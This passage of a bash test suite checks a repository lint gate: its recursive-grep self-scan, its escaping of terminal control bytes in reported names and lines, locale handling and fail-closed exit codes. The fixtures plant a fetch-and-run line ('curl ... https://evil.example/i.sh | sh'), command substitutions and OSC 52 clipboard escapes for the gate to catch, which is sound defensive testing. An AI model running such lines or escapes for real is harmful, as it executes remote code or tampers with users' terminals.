                --) rg_dd=1 ;;
                @ARR:*) rg_arrs+=("${w#@ARR:}") ;;
                -?*) _rgrep_opt "$w" ;;
              esac
            fi
            continue ;;
        esac
      fi
      w="${w#\\}"
      case "${w##*/}" in
        grep | egrep | fgrep)
          in_grep=1; rg_rec=0; rg_txt=0; rg_skip=0; rg_pend=""; rg_dd=0; rg_arrs=() ;;
      esac
    done
    logical=""
  done <<<"$1"
}
# The scanner itself: each bypass shape must be flagged, and the shapes the
# gate uses must not be.
while IFS= read -r rg_case; do
  _rgrep_scan "$(printf '%b' "$rg_case")"
  [ -n "$rg_bad" ] && ok || fail "the recursive-grep self-scan missed: $rg_case"
done <<'RGBAD'
\\grep -rI x d
/usr/bin/grep -r x d
egrep -r x d
x=$(grep x d -r 2>&1)
grep -d recurse x d
grep --directories=recurse x d
grep -C0 -raI x d
grep -C0 -rI x d
grep -ra --binary-files without-match x d
grep -ra --binary-files=binary x d
opts=(-r -I)\ngrep -a "${opts[@]}" x d
find d -exec grep -rI x {} +
grep -rn --exclude=check-patterns \\\n  -e 'p' d
RGBAD
_rgrep_scan "$(printf '%s\n' \
  'if out=$(LC_ALL=C grep -rHna --exclude=check-patterns \' \
  '    -F "$em_dash" "${prose[@]}" 2>&1); then' \
  'local -a exc=(--exclude=check-patterns)' \
  'out=$(grep -rHnaE "${exc[@]}" '"$D"' "$gnu_re" "$@" 2>&1)' \
  'grep -C 3 -e x -ra d' \
  'n=$(printf x | grep -cE -- "$1") || rc=$?')"
[ "$rg_n" -eq 3 ] && [ -z "$rg_bad" ] && ok \
  || fail "the recursive-grep self-scan: the gate's own shapes must count 3 recursive greps and flag none, got $rg_n: $rg_bad"
_rgrep_scan "$cp_code"
# EXACT, not a floor: a recursive grep added or dropped changes this count,
# so the change is reviewed here (arms 1, 2, 5, 6, 8, 9, 10, 11, 13, 14).
[ "$rg_n" -eq 10 ] && [ -z "$rg_bad" ] && ok \
  || fail "bin/check-patterns: every recursive grep must pass -a and no grep may pass -I ($rg_n recursive greps found, want exactly 10): $rg_bad"
# No here-string or here-doc in the gate's code: bash 3.2 backs both with a
# temp file, and one that cannot be created fails the command with status 1,
# which the gate would read as grep's "no match" (see _code_hits). Static
# only: bash falls back from an unusable TMPDIR to /tmp, so no fixture here
# can make that temp file fail.
cp_heredoc="$(grep -nE -e "<<-?<?[[:space:]]*[\"'\$A-Za-z_]" <<<"$cp_code" || true)"
[ -z "$cp_heredoc" ] && ok \
  || fail "bin/check-patterns: a here-string or here-doc in the gate's code: $cp_heredoc"

esc=$'\033'; bel=$'\007'; del=$'\177'
c1=$'\xc2\x9b'; lone=$'\x9b'; rsq=$'\xe2\x80\x99'
osc52="${esc}]52;c;aGk=${bel}"; csi="${esc}[2J"
osc52_x='\x1b]52;c;aGk=\x07'; csi_x='\x1b[2J'
tty_out="$work/tty-stdout"; tty_err="$work/tty-stderr"
# _tty_run ROOT [ENV=VAL...] - run the gate, stdout and stderr to separate files.
_tty_run() {
  local root="$1"; shift
  tty_rc=0
  env STRICT= "$@" "$cp" "$root" > "$tty_out" 2> "$tty_err" || tty_rc=$?
}
# _tty_clean LABEL BYTES... - no stream may hold any of BYTES raw.
_tty_clean() {
  local label="$1" f b; shift
  for f in "$tty_out" "$tty_err"; do
    for b in "$@"; do
      if LC_ALL=C grep -qF -e "$b" "$f"; then
        fail "$label: a raw control byte reached ${f##*/}: $(od -c < "$f" | sed -n 1,12p)"
      fi
    done
  done
  ok
}
# _tty_has LABEL FILE TEXT - FILE holds TEXT (fixed string, byte-exact).
_tty_has() {
  LC_ALL=C grep -qF -e "$3" "$2" && ok \
    || fail "$1: expected '$3' in ${2##*/}, got: $(cat "$2")"
}
# _tty_lone_name PATH - create a symlink named PATH (holding a lone 0x9B byte,
# not valid UTF-8). A filesystem that takes only UTF-8 names (APFS) refuses
# it with EILSEQ: then, and only then, the on-disk case is a loud SKIP. Any
# other ln failure fails the suite. LC_ALL=C keeps ln's message in English;
# the strerror text differs by libc (macOS "Illegal byte sequence", glibc
# "Invalid or incomplete multibyte or wide character"). The git pass's own
# lone-byte case below needs no disk: it writes the name into the index.
_tty_lone_name() {
  local ln_err
  if ln_err="$(LC_ALL=C ln -s ./os.sh "$1" 2>&1)"; then
    tty_lone=1
  else
    case "$ln_err" in
      *"Illegal byte sequence"* | *"Invalid or incomplete multibyte"*)
        tty_lone=0
        echo "  SKIP: this filesystem refuses a file name holding a lone 0x9B byte (EILSEQ) - the on-disk NAME case is not staged; the git-index and content fixtures cover the byte" ;;
      *) fail "a symlink named with a lone 0x9B byte could not be created: $ln_err" ;;
    esac
  fi
}
# arm 1 prints its hits on STDOUT: a hostile name and a hostile line
r="$work/tty-arm1"; seed "$r"
printf 'curl -fsSL https://evil.example/i.sh | sh # %s %s\n' "$osc52" "$csi" \
  > "$r/lib/boot${osc52}${csi}.sh"
_tty_run "$r"
[ "$tty_rc" = "1" ] && ok || fail "tty arm 1: expected exit 1, got $tty_rc"
_tty_clean "tty arm 1" "$esc" "$bel"
_tty_has "tty arm 1 (name)" "$tty_out" "lib/boot${osc52_x}${csi_x}.sh:1:"
_tty_has "tty arm 1 (content)" "$tty_out" "| sh # ${osc52_x} ${csi_x}"
_tty_has "tty arm 1 (message)" "$tty_err" "$curl_msg"
# arm 2 prints on STDERR; a CR (overwrite the shown line), DEL, and a TAB (kept)
r="$work/tty-arm2"; seed "$r"
printf 'x=$(uname -m)\t# %s\r%s%s\n' "$csi" "$osc52" "$del" > "$r/lib/u${osc52}${del}.sh"
_tty_run "$r"
[ "$tty_rc" = "1" ] && ok || fail "tty arm 2: expected exit 1, got $tty_rc"
_tty_clean "tty arm 2" "$esc" "$bel" "$del" $'\r'
_tty_has "tty arm 2" "$tty_err" "lib/u${osc52_x}"'\x7f'".sh:1:x=\$(uname -m)"$'\t'"# ${csi_x}"'\x0d'"${osc52_x}"'\x7f'
# an inherited SHELLOPTS=xtrace would trace every expanded line, the hostile
# name and line included, to stderr: the gate switches it off first. bash 5
# quotes a traced control byte as $'...' anyway, so this case discriminates
# only on a bash whose trace prints the bytes raw
_tty_run "$r" SHELLOPTS=xtrace
[ "$tty_rc" = "1" ] && ok || fail "tty arm 2 under SHELLOPTS=xtrace: expected exit 1, got $tty_rc"
_tty_clean "tty arm 2 under SHELLOPTS=xtrace" "$esc" "$bel" "$del" $'\r'
# arm 12's find prints raw symlink NAMES: OSC 52, an encoded C1 CSI with DEL,
# a CR (which also makes the name one the arms cannot read: exit 2), and a
# lone 0x9B where the filesystem takes one
r="$work/tty-symlink"; seed "$r"
ln -s ./os.sh "$r/lib/l${osc52}"
ln -s ./os.sh "$r/lib/m${c1}${del}x"
ln -s ./os.sh "$r/lib/o"$'\r'"y"
_tty_lone_name "$r/lib/n${lone}z"
_tty_run "$r"
[ "$tty_rc" = "2" ] && ok || fail "tty symlink: expected exit 2 (a CR in a name), got $tty_rc"
_tty_clean "tty symlink" "$esc" "$bel" "$del" $'\r' "$c1" "$lone"
_tty_has "tty symlink (OSC 52)" "$tty_err" "lib/l${osc52_x}"
_tty_has "tty symlink (C1, DEL)" "$tty_err" 'lib/m\xc2\x9b\x7fx'
_tty_has "tty symlink (CR)" "$tty_err" 'lib/o\x0dy'
[ "$tty_lone" = 0 ] || _tty_has "tty symlink (lone 0x9B)" "$tty_err" 'lib/n\x9bz'
# an unreadable directory named with OSC 52: every walk over it errors, and
# the error text (find's own stderr included) names it
if [ "$(id -u)" -ne 0 ]; then
  r="$work/tty-unreadable"; seed "$r"; mkdir -p "$r/lib/d${osc52}"
  chmod 000 "$r/lib/d${osc52}"
  _tty_run "$r"
  chmod u+rwx "$r/lib/d${osc52}"
  [ "$tty_rc" = "2" ] && ok || fail "tty unreadable dir: expected exit 2 (a scan error), got $tty_rc"
  _tty_clean "tty unreadable dir" "$esc" "$bel"
  # The name must be SHOWN, escaped by someone: GNU grep and find print it
  # raw, so the gate's sanitizer escapes it (\x1b ... \x07); the macOS BSD
  # grep and find escape a control byte in a name themselves (\033 ... \a,
  # measured on both macOS CI legs), so it reaches the sanitizer already
  # safe. _tty_clean above is the security half; this is the "named" half.
  # So this case proves the sanitizer on GNU tools only. On macOS the
  # sanitizer's coverage of a raw hostile NAME stands on the tty-symlink and
  # tty-git fixtures, whose names reach it through DATA output (find -print,
  # git ls-files), which BSD tools leave raw; the per-find shim cases above
  # prove each find pass's stderr reaches it, on both.
  LC_ALL=C grep -qF -e "lib/d${osc52_x}" -e 'lib/d\033]52;c;aGk=\a' "$tty_err" && ok \
    || fail "tty unreadable dir: expected the name escaped in tty-stderr, got: $(cat "$tty_err")"
else
  echo "  SKIP: running as root - cannot exercise the unreadable-dir terminal-safe case"
fi
# the repo-wide git pass prints raw tracked NAMES outside every other surface
if command -v git >/dev/null 2>&1; then
  r="$work/tty-git"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other"
  ln -s ../lib/os.sh "$r/other/g${csi}"
  ln -s ../lib/os.sh "$r/other/h${c1}${del}"
  ln -s ../lib/os.sh "$r/other/i"$'\r'
  git -C "$r" add -A
  # The lone-0x9B name goes straight into the index as a symlink entry: git
  # stores a path as bytes, so this runs where the filesystem (APFS) would
  # refuse the name. After `add -A`, which would drop an index entry with no
  # file on disk. The path goes in on STDIN (`--index-info`), never argv:
  # git passes every builtin's argv through precompose_argv_prefix (git.c),
  # which on macOS with core.precomposeunicode (git init sets it there) runs
  # each non-ASCII argument through iconv UTF-8-MAC -> UTF-8 and keeps the
  # original only when iconv errors (compat/precompose_utf8.c). The
  # `--cacheinfo` form stored some other path on both macOS CI legs, silently.
  # read_index_info has no precompose step; the -c is belt and braces. The
  # gate itself passes git no tree path (ls-files -s -z, no pathspec), so it
  # reads the index bytes as they are.
  tty_blob="$(printf '../lib/os.sh' | git -C "$r" hash-object -w --stdin)"
  printf '120000 %s\tother/j%s\000' "$tty_blob" "$lone" \
    | git -C "$r" -c core.precomposeunicode=false update-index -z --index-info \
    || fail "tty git pass: update-index --index-info refused the lone-0x9B path"
  git -C "$r" commit -qm init
  # A byte compare in bash over the NUL-separated listing (no tr or grep to
  # doubt), and on a miss the listing itself, `od -c`-escaped.
  git -C "$r" ls-files -z > "$work/tty-git-ls" \
    || fail "tty git pass: git ls-files failed"
  tty_found=0
  while IFS= read -r -d '' p; do
    [ "$p" = "other/j${lone}" ] && tty_found=1
  done < "$work/tty-git-ls"
  [ "$tty_found" = 1 ] \
    || fail "tty git pass: the lone-0x9B name did not reach the index; ls-files -z: $(od -c < "$work/tty-git-ls" | sed -n 1,40p)"
  _tty_run "$r"
  [ "$tty_rc" = "2" ] && ok || fail "tty git pass: expected exit 2 (a CR in a tracked name), got $tty_rc"
  _tty_clean "tty git pass" "$esc" "$del" $'\r' "$c1" "$lone"
  _tty_has "tty git pass (CSI)" "$tty_err" "other/g${csi_x}"
  _tty_has "tty git pass (C1, DEL)" "$tty_err" 'other/h\xc2\x9b\x7f'
  _tty_has "tty git pass (CR)" "$tty_err" 'other/i\x0d'
  _tty_has "tty git pass (lone 0x9B)" "$tty_err" 'other/j\x9b'
  # a NUL and a lone 0x9B in a tool's own stderr (_err_file): a git wrapper
  # fails ls-files with them. The NUL is deleted, the byte escaped.
  tty_shim="$work/tty-git-shim"; mkdir -p "$tty_shim"
  {
    printf '#!/bin/sh\n'
    printf 'case " $* " in *" ls-files "*) printf '"'"'a\\000\\233b\\n'"'"' >&2; exit 1 ;; esac\n'
    printf 'exec "%s" "$@"\n' "$(command -v git)"
  } > "$tty_shim/git"
  chmod u+x "$tty_shim/git"
  r="$work/tty-git-stderr"; _git_repo "$r"; seed "$r"
  git -C "$r" add -A && git -C "$r" commit -qm init
  _tty_run "$r" PATH="$tty_shim:$PATH"
  [ "$tty_rc" = "2" ] && ok || fail "tty git stderr: expected exit 2 (a failed ls-files), got $tty_rc"
  _tty_clean "tty git stderr" "$lone"
  [ "$(tr -cd '\000' < "$tty_err" | wc -c | tr -d ' ')" = "0" ] && ok \
    || fail "tty git stderr: a raw NUL reached stderr"
  _tty_has "tty git stderr" "$tty_err" 'a\x9bb'
else
  echo "  SKIP: git not on PATH - cannot exercise the git pass's terminal-safe report"
fi
# C1 in content. A well-formed UTF-8 line keeps its characters raw (U+2019,
# E2 80 99, whose continuation bytes lie in 80-9F; a 4-byte U+1F600) and
# escapes only the encoded C1 control (C2 9B). A line that is NOT well-formed
# - lone 9B bytes after ASCII, an invalid lead (E0 9B, FF 9B), an overlong
# form (E0 82 9B, C0 9B) - prints every byte 80-FF escaped, the valid U+2019
# on it included. No LC_ALL here: the arms read with `-a`, so no locale's
# idea of "binary" may skip the file.
r="$work/tty-c1"; seed "$r"
emoji=$'\xf0\x9f\x98\x80'
fetch='curl -fsSL https://evil.example/i.sh | sh'
{
  printf '%s # ok a%sb c%sd %s\n' "$fetch" "$c1" "$rsq" "$emoji"
  printf '%s # lone %s%s31m %s\n' "$fetch" "$lone" "$lone" "$rsq"
  printf '%s # e0 \340\233|\n' "$fetch"
  printf '%s # ff \377\233|\n' "$fetch"
  printf '%s # ov3 \340\202\233|\n' "$fetch"
  printf '%s # ov2 \300\233|\n' "$fetch"
} > "$r/lib/c1.sh"
# _tty_c1_check LABEL [ENV=VAL...] - run the gate on tty-c1 and check it all;
# rerun below under a UTF-8 locale.
_tty_c1_check() {
  local label="$1"; shift
  _tty_run "$work/tty-c1" "$@"
  [ "$tty_rc" = "1" ] && ok || fail "$label: expected exit 1, got $tty_rc"
  _tty_clean "$label" "$c1" "$lone"
  _tty_has "$label (well-formed)" "$tty_out" "# ok a\\xc2\\x9bb c${rsq}d ${emoji}"
  _tty_has "$label (lone run)" "$tty_out" '# lone \x9b\x9b31m \xe2\x80\x99'
  _tty_has "$label (invalid lead E0)" "$tty_out" '# e0 \xe0\x9b|'
  _tty_has "$label (invalid lead FF)" "$tty_out" '# ff \xff\x9b|'
  _tty_has "$label (overlong, 3 bytes)" "$tty_out" '# ov3 \xe0\x82\x9b|'
  _tty_has "$label (overlong, 2 bytes)" "$tty_out" '# ov2 \xc0\x9b|'
}
_tty_c1_check "tty C1"
# LINEAR cost: a 32 KB run of lone 0x9B bytes on one line. An earlier
# re-run loop took 39 s on it (measured); the bound leaves a slow runner
# ample room while any quadratic pass blows through it.
# shellcheck source=tests/lib/bounded_run.sh
. "$repo_root/tests/lib/bounded_run.sh"
r="$work/tty-long"; seed "$r"
{ printf '%s # ' "$fetch"; dd if=/dev/zero bs=1024 count=32 2>/dev/null | tr '\000' '\233'; printf '\n'; } \
  > "$r/lib/long.sh"
# _tty_long_check LABEL [ENV=VAL...] - the bounded run; rerun below under a
# UTF-8 locale.
_tty_long_check() {
  local label="$1"; shift
  bounded_run 20 "$work/tty-long.out" env STRICT= "$@" "$cp" "$work/tty-long" \
    || fail "$label: bounded_run could not turn job control on"
  [ "$br_stuck" = 0 ] && [ "$br_hung" = 0 ] && ok \
    || fail "$label: the gate outlived 20 s on a 32 KB line (hung $br_hung, stuck $br_stuck)"
  [ "$br_rc" = "1" ] && ok || fail "$label: expected exit 1, got $br_rc"
  LC_ALL=C grep -qF -e "$lone" "$work/tty-long.out" \
    && fail "$label: a raw 0x9B reached the output"
  tty_n="$(LC_ALL=C grep -o -e '\\x9b' "$work/tty-long.out" | wc -l | tr -d ' ')"
  [ "$tty_n" = "32768" ] && ok || fail "$label: expected 32768 escaped bytes, got $tty_n"
}
_tty_long_check "tty long line"
# the sanitizer FAILS CLOSED: a `sed` that fails only for the sanitizer (its
# one `}` argument), and only on its FIRST call (a state file), via _err (arm
# 2 prints first) and via _out (arm 1 prints first): exit 2 and the fixed
# message, never a report silently dropped. First call only, so a helper
# that swallowed the failure is caught: every later print succeeds, and the
# gate would then exit 1 with a report missing its first lines.
tty_sed_shim="$work/tty-sed-shim"; mkdir -p "$tty_sed_shim"
tty_sed_state="$work/tty-sed-state"
{
  printf '#!/bin/sh\n'
  printf 'for a in "$@"; do\n'
  printf '  if [ "$a" = "}" ] && [ ! -e "$TTY_SED_STATE" ]; then : > "$TTY_SED_STATE"; exit 1; fi\n'
  printf 'done\n'
  printf 'exec "%s" "$@"\n' "$(command -v sed)"
} > "$tty_sed_shim/sed"
chmod u+x "$tty_sed_shim/sed"
# A FRESH shell: the shim must be the sed a new process resolves.
[ "$(PATH="$tty_sed_shim:$PATH" bash -c 'command -v sed')" = "$tty_sed_shim/sed" ] \
  || fail "the sed shim is not the sed a fresh process resolves"
tty_fail_msg="check-patterns: the report sanitizer (tr | sed) failed - failing closed"
r="$work/tty-sedfail-err"; seed "$r"
printf 'x=$(uname -m)\n' > "$r/lib/u.sh"
rm -f "$tty_sed_state"
_tty_run "$r" PATH="$tty_sed_shim:$PATH" TTY_SED_STATE="$tty_sed_state"
[ "$tty_rc" = "2" ] && ok || fail "a failing sanitizer (via _err) must exit 2, got $tty_rc"
[ "$(cat "$tty_err")" = "$tty_fail_msg" ] && ok \
  || fail "a failing sanitizer (via _err): expected exactly '$tty_fail_msg', got: $(cat "$tty_err")"
r="$work/tty-sedfail-out"; seed "$r"
printf '%s\n' "$fetch" > "$r/lib/boot.sh"
rm -f "$tty_sed_state"
_tty_run "$r" PATH="$tty_sed_shim:$PATH" TTY_SED_STATE="$tty_sed_state"
[ "$tty_rc" = "2" ] && ok || fail "a failing sanitizer (via _out) must exit 2, got $tty_rc"
[ "$(cat "$tty_err")" = "$tty_fail_msg" ] && ok \
  || fail "a failing sanitizer (via _out): expected exactly '$tty_fail_msg', got: $(cat "$tty_err")"
# and with stderr UNWRITABLE (opened read-only, which every write refuses on
# GNU and BSD alike; a CLOSED fd 2 is no test, since the next file the gate
# opens takes that number), where even the fixed message cannot be written:
# still exit 2, never the 1 a failed printf under `set -e` would give
tty_rc=0; rm -f "$tty_sed_state"
PATH="$tty_sed_shim:$PATH" TTY_SED_STATE="$tty_sed_state" STRICT= "$cp" "$work/tty-sedfail-err" \
  >/dev/null 2</dev/null || tty_rc=$?
[ "$tty_rc" = "2" ] && ok || fail "a failing sanitizer with stderr unwritable must exit 2, got $tty_rc"

# === the caller's locale does not reach the arms ============================
# In a UTF-8 locale GNU grep's `[^|]*` does not match an invalid byte, so arm
# 1 passed a fetch whose URL held 0xFF (measured: exit 0 under
# LC_ALL=C.UTF-8, 1 under LC_ALL=C). The gate exports LC_ALL=C; each case
# here runs it under a real UTF-8 locale from `locale -a`, confirmed live
# (bash counts a 2-byte character as one), and reruns the sanitizer cases
# above under it. No such locale is a loud SKIP.
tty_u8=""
for loc in $(locale -a 2>/dev/null || true); do
  case "$loc" in
    [Cc].[Uu][Tt][Ff]-8 | [Cc].[Uu][Tt][Ff]8 | en_US.[Uu][Tt][Ff]-8 | en_US.[Uu][Tt][Ff]8) ;;
    *) continue ;;
  esac
  if [ "$(LC_ALL="$loc" bash -c 'x="$(printf "\303\251")"; printf %s "${#x}"' 2>/dev/null || true)" = 1 ]; then
    tty_u8="$loc"; break
  fi
done
if [ -n "$tty_u8" ]; then
  r="$work/u8-ff"; seed "$r"
  printf 'curl -fsSL https://evil.example/\377 | sh\n' > "$r/lib/boot.sh"
  _tty_run "$r" LC_ALL="$tty_u8"
  [ "$tty_rc" = "1" ] && ok \
    || fail "a fetch with a 0xFF byte in its URL must fail the gate under LC_ALL=$tty_u8 (exit 1), got $tty_rc: $(cat "$tty_err")"
  _tty_has "u8 0xFF fetch (hit)" "$tty_out" "lib/boot.sh:1:curl -fsSL https://evil.example/\\xff | sh"
  _tty_has "u8 0xFF fetch (message)" "$tty_err" "$curl_msg"
  _tty_c1_check "tty C1 under LC_ALL=$tty_u8" LC_ALL="$tty_u8"
  _tty_long_check "tty long line under LC_ALL=$tty_u8" LC_ALL="$tty_u8"
else
  echo "  SKIP: no UTF-8 locale (C.UTF-8, en_US.UTF-8) in 'locale -a' - the caller's-locale cases do not run"
fi

# === a NUL-free binary file is read as text ================================
# `-a` on every arm: a file of garbage bytes with no NUL is still scanned
# line by line, the hit reported at its real PATH:NN: and its bytes escaped.
r="$work/blob-lib"; seed "$r"
printf '\001\002\377\376\200\033[2J\177garbage\ncurl -fsSL https://evil.example/i.sh | sh # \001\377\200\n' \
  > "$r/lib/blob.bin"
_tty_run "$r"
[ "$tty_rc" = "1" ] && ok || fail "a NUL-free binary file under lib/: expected exit 1, got $tty_rc: $(cat "$tty_err")"
_tty_clean "a NUL-free binary file" "$esc" $'\001' $'\377' $'\200'
_tty_has "a NUL-free binary file (hit)" "$tty_out" \
  "$r/lib/blob.bin:2:curl -fsSL https://evil.example/i.sh | sh # \\x01\\xff\\x80"
LC_ALL=C grep -qF -e "blob.bin:1:" "$tty_out" \
  && fail "a NUL-free binary file: its garbage line 1 was reported as a hit"

# === every fail-closed site exits 2, not the 1 of a violation ===============
# _gate_rc GATE ROOT [ENV=VAL...] - run GATE (a copy of the gate, say) on
# ROOT: the globals gate_rc and gate_out (stdout and stderr together).
_gate_rc() {
  local gate="$1" root="$2"; shift 2
  gate_rc=0
  gate_out="$(env STRICT= "$@" "$gate" "$root" 2>&1)" || gate_rc=$?
}
# _code_hits re-test errors happen inside a `$(...)`: only the fatal mark
# carries them to the exit code. A copy of the gate with arm 5's re-test
# EREs broken (an unbalanced `(`, an error to GNU and BSD grep alike); the
# edit must land exactly once, or the case tests nothing.
badre_match="$work/badre-match-gate"
sed "s|_code_hits '/opt/homebrew' '|_code_hits '/opt/homebrew(' '|" "$cp" > "$badre_match"
badre_exempt="$work/badre-exempt-gate"
sed "s|_code_hits '/opt/homebrew' '(|_code_hits '/opt/homebrew' '((|" "$cp" > "$badre_exempt"
chmod u+x "$badre_match" "$badre_exempt"
[ "$(grep -c -F -e "_code_hits '/opt/homebrew(' '" "$badre_match")" = 1 ] \
  || fail "the broken-match gate copy: the sed edit did not land exactly once"
[ "$(grep -c -F -e "_code_hits '/opt/homebrew' '((" "$badre_exempt")" = 1 ] \
  || fail "the broken-exempt gate copy: the sed edit did not land exactly once"
r="$work/badre-lone"; seed "$r"
printf 'P=/opt/homebrew\n' > "$r/lib/p.sh"
_gate_rc "$badre_match" "$r"
[ "$gate_rc" = "2" ] && ok || fail "a code re-test error must exit 2, got $gate_rc: $gate_out"
case "$gate_out" in
  *"check-patterns: code re-test errored"*"$r/lib/p.sh:1:"* | *"$r/lib/p.sh:1:"*"check-patterns: code re-test errored"*) ok ;;
  *) fail "a code re-test error must report itself AND the hit: $gate_out" ;;
esac
r="$work/badre-pair"; seed "$r"
printf 'for p in /opt/homebrew /usr/local; do :; done\n' > "$r/lib/p.sh"
[ "$(run "$r")" = "0" ] || fail "the adjacent /opt/homebrew /usr/local pair must pass the real gate"
_gate_rc "$badre_exempt" "$r"
[ "$gate_rc" = "2" ] && ok || fail "an exemption re-test error must exit 2, got $gate_rc: $gate_out"
case "$gate_out" in
  *"check-patterns: exemption re-test errored"*) ok ;;
  *) fail "an exemption re-test error must report itself: $gate_out" ;;
esac
# the fatal mark itself cannot be written while the sanitizer fails inside
# a `$(...)` (the first-call sed shim above). In arm 8, _gnu_scan returns 0
# after its _code_hits pipeline, so nothing but the signal to the main shell
# is left to carry the error, and the exit is 2 (measured: with the `kill`
# dropped, arm 8 exits 0, its hit lost with the pipeline; that mutant
# survives arm 5 alone, whose failed `viol=$(...)` the ERR trap also turns
# into 2). Both arms run.
# A mktemp shim plants `fatal` in the gate's scratch dir as a DANGLING
# symlink: the write fails (its target's dir does not exist, root included),
# and `-e` reads it as absent, so it cannot stand in for the mark (a
# directory there would: `-e` is true for one, and that mutant survived).
# The pinned-plugin file is planted so arm 4 prints no SKIP first.
mark_shim="$work/mktemp-mark-shim"; mkdir -p "$mark_shim"
{
  printf '#!/bin/sh\n'
  printf 'case "$*" in *check-patterns.XXXXXX*) d="$("%s" "$@")" || exit $?; ln -s "$d/no-such-dir/mark" "$d/fatal" || exit 1; printf "%%s\\n" "$d"; exit 0 ;; esac\n' "$(command -v mktemp)"
  printf 'exec "%s" "$@"\n' "$(command -v mktemp)"
} > "$mark_shim/mktemp"
chmod u+x "$mark_shim/mktemp"
badre_gnu="$work/badre-gnu-gate"
sed 's|\(printf .%s.n. "$out" [|] _code_hits "$gnu_re\)"$|\1("|' "$cp" > "$badre_gnu"
chmod u+x "$badre_gnu"
[ "$(grep -c -F -e '_code_hits "$gnu_re("' "$badre_gnu")" = 1 ] \
  || fail "the broken arm 8 gate copy: the sed edit did not land exactly once"
for mk in "5|$badre_match|P=/opt/homebrew" "8|$badre_gnu|sed -e 's/\\s//' f"; do
  mk_arm="${mk%%|*}"; mk_rest="${mk#*|}"; mk_gate="${mk_rest%%|*}"
  r="$work/mark-unwritable-$mk_arm"; seed "$r"; mkdir -p "$r/zsh/plugins/fast-syntax-highlighting"
  printf '%s\n' '$(uname -a)' > "$r/zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
  printf '%s\n' "${mk_rest#*|}" > "$r/lib/p.sh"
  _gate_rc "$mk_gate" "$r"
  [ "$gate_rc" = "2" ] || fail "the arm $mk_arm mark fixture's premise: the broken-match copy must exit 2 alone, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"check-patterns: code re-test errored"*) ;;
    *) fail "the arm $mk_arm mark fixture's premise: the broken-match copy must report the re-test error: $gate_out" ;;
  esac
  rm -f "$tty_sed_state"
  _gate_rc "$mk_gate" "$r" PATH="$tty_sed_shim:$mark_shim:$PATH" TTY_SED_STATE="$tty_sed_state"
  [ "$gate_rc" = "2" ] && ok \
    || fail "arm $mk_arm: a failed sanitizer AND an unwritable fatal mark inside a \$(...) must still exit 2, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"check-patterns: could not write the fail-closed mark - failing closed"*) ok ;;
    *) fail "arm $mk_arm: an unwritable fatal mark must say so: $gate_out" ;;
  esac
done
# the repo-wide git pass: each of its exit-2 sites not already pinned to 2
# above (lev, probe, toplevel, ls-files error, stderr, malformed record)
if command -v git >/dev/null 2>&1; then
  r="$work/gm-bad"; _git_repo "$r"; seed "$r"
  git -C "$r" add -A && git -C "$r" commit -qm init
  printf '[submodule "x"\n\tpath = zsh/plugins/x\n' > "$r/.gitmodules"
  fails_with_rc 2 "$r" "check-patterns: symlink scan (git, repo-wide) could not read .gitmodules" \
    "a .gitmodules git cannot parse must fail closed" only
  sym_tmp_shim="$work/mktemp-sym-shim"; mkdir -p "$sym_tmp_shim"
  {
    printf '#!/bin/sh\n'
    printf 'case "$*" in *check-patterns-sym.*) echo "mktemp: simulated failure" >&2; exit 1 ;; esac\n'
    printf 'exec "%s" "$@"\n' "$(command -v mktemp)"
  } > "$sym_tmp_shim/mktemp"
  chmod u+x "$sym_tmp_shim/mktemp"
  r="$work/sym-tmp-fail"; _git_repo "$r"; seed "$r"
  git -C "$r" add -A && git -C "$r" commit -qm init
  PATH="$sym_tmp_shim:$PATH" fails_with_rc 2 "$r" \
    "check-patterns: could not create a scratch dir for the repo-wide symlink scan" \
    "the git pass's scratch dir failing must fail closed" only
  # a refused NAME tracked but gone from disk: only the git pass sees it
  for tn in "lib/a:b.sh|$names_msg" "lib/sub/check-patterns|$stray_msg"; do
    tn_rel="${tn%%|*}"
    r="$work/tracked-only-$(printf '%s' "${tn_rel##*/}" | tr ':.' '--')"
    _git_repo "$r"; seed "$r"; mkdir -p "$r/$(dirname "$tn_rel")"
    printf 'x\n' > "$r/$tn_rel"
    git -C "$r" add -A && git -C "$r" commit -qm init
    rm "$r/$tn_rel"
    fails_with_rc 2 "$r" "${tn#*|}" "a tracked $tn_rel absent from disk must fail closed via the git pass" only
  done
else
  echo "  SKIP: git not on PATH - cannot exercise the git pass's remaining exit-2 sites"
fi
# arm 4's grep erroring on the pinned-plugin file: a scan error, exit 2, and
# its stderr (which names the file) printed through the sanitizer
r="$work/shim-grep-err"; seed "$r"; mkdir -p "$r/zsh/plugins/fast-syntax-highlighting"
printf '%s\n' '$(uname -a)' > "$r/zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
[ "$(run_strict "$r")" = "0" ] || fail "arm 4's grep-error fixture must pass as planted"
shim_grep="$work/shim-grep-shim"; mkdir -p "$shim_grep"
{
  printf '#!/bin/sh\n'
  printf 'for a in "$@"; do case "$a" in *fast-syntax-highlighting.plugin.zsh) printf '"'"'grep: \\033]52;c;aGk=\\007 simulated\\n'"'"' >&2; exit 2 ;; esac; done\n'
  printf 'exec "%s" "$@"\n' "$(command -v grep)"
} > "$shim_grep/grep"
chmod u+x "$shim_grep/grep"
_tty_run "$r" PATH="$shim_grep:$PATH"
[ "$tty_rc" = "2" ] && ok || fail "arm 4's grep erroring must exit 2, got $tty_rc: $(cat "$tty_err")"
_tty_clean "arm 4's grep error" "$esc" "$bel"
_tty_has "arm 4's grep error (message)" "$tty_err" \
  "reading zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh errored"
_tty_has "arm 4's grep error (its stderr, escaped)" "$tty_err" "grep: ${osc52_x} simulated"
# the NUL pass decides "unreadable" by opening the file, not by a `-r` test
if [ "$(id -u)" -ne 0 ]; then
  r="$work/nul-unreadable"; seed "$r"; mkdir -p "$r/docs"
  printf 'x\n' > "$r/docs/locked.md"
  chmod 000 "$r/docs/locked.md"
  fails_with_rc 2 "$r" "check-patterns: NUL-byte scan cannot read" "an unreadable file must fail the NUL pass closed"
  chmod u+rw "$r/docs/locked.md"
else
  echo "  SKIP: running as root - cannot exercise the NUL pass's unreadable-file case"
fi

# === a tool failing where the gate reads its answer fails closed ============
# _argfail_shim DIR TOOL - a TOOL on PATH that fails (stderr, exit
# $ARG_FAIL_RC, default 2) on the one call holding an argument exactly equal
# to $ARG_FAIL_ON, and runs the real TOOL for every other call, so the
# failure lands on one site of the gate and nowhere else. $ARG_FAIL_TAIL
